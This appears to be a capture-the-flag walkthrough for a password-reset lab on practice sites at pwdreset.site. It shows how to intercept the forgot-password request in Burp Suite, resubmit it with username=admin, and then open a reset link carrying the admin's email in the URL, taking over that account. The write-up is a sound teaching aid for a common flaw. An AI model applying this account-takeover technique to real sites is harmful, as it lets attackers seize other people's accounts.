# Challenge #1 - Password Reset 1- 4

## Credentials:
Username: atk
Password: atk

## Objectives

- All the http://*.pwdreset.site web applications implement different password reset mechanisms.
- Your job is to find a way to exploit these implementations in order to reset the password of any user you want.

## Hints

- Recommended tools
  - Web browser
  - Burp Suite

## Steps

## Steps

With burp suite enable login the system. The welcome show a list of users as below.

```
Welcome atk

    Username: atk
    Password: atk
    Email: atk@atk.com 

List of users

Username: admin || Email: admin@pwdreset.site
Username: atk || Email: atk@atk.com
Username: darkenedjump || Email: Suspendisse.dui@nequeSedeget.net
Username: slipperyraspy || Email: sagittis@scelerisque.ca
```

Do logout, them click in reset password and them continue.

```
http://2.pwdreset.site/forgot.php
```

A message will appear saying that you have a email message, click on the link. You have one message with a link to reset the password.

```
From: admin@pwdreset.site Message:

Someone requested a password reset for the following account:
Username: atk

If this was a mistake, just ignore this email and nothing will happen.
To reset your password, visit the following address: http://2.pwdreset.site/reset_pwd.php?useremail=atk@atk.com 
```

Copy the link, change the useremail with one from the list on the first page and them sent to the browser.

```
http://2.pwdreset.site/reset_pwd.php?useremail=admin@pwdreset.site
```

If you open this link on the browser, the system you send a message as below.

```
warning: No reset action found for this account.
```

Go to burp suite history and search for the /forgot.php request and them send the request to burp repeater.

Change the password to admin and send the request.

```
username=admin
```

Now try opening the reset link one more time.

```
http://2.pwdreset.site/reset_pwd.php?useremail=admin@pwdreset.site
```

Set a new password for this user and them login using this new credentials.
